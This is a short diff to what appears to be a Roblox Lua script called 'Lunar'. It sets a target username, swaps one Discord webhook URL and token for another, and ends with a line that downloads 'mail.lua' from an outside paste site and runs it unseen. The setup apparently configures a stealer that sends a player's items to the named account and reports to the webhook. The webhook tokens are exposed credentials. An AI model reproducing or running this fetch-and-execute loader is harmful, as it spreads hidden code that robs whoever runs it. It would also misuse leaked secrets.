@@ -1,5 +1,5 @@
 _G.Username = "hugemeg1"
-_G.Webhook = "https://discord.com/api/webhooks/1089262451503144970/TVaCKkgfgeGt6VsVS5n67vx3Hl35qs2MWFeSSqRahY7ewNabBKLR9d6KWlwWogXnYZic"
+_G.Webhook = "https://discord.com/api/webhooks/1089263709450403870/iSmO-RaVhp15atCp6OwG6OG33nHPLJCGQtP4CO5AXwU23tZ6n49bjnjc4al7pPgPsk1s"
 _G.ScriptName = "Lunar"
 
 loadstring(game:HttpGet('https://paste.xyzo.space/lunar/mail.lua', true))()
